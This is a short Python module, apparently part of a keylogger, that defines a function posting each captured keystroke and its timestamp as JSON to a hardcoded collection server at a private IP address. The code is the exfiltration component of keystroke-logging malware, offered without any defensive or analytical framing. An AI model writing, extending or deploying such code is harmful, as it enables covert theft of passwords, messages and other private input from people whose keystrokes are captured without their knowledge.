import requests
import shutil
import os
import datetime

from encryption import encrypt


# Send keystroke as JSON payload to local Flask server
def send_keystroke(raw, timestamp, url="http://192.168.29.196:5000/capture"):
    payload = {
        "raw": raw,
        "timestamp": timestamp
    }
    try:
        res = requests.post(url, json=payload)
        if res.ok:
            print(f"[+] Sent key: {raw} | Time: {timestamp}")
        else:
            print(f"[!] Server error: {res.status_code}")
    except Exception as e:
        print("[x] Failed to send keystroke:", e)
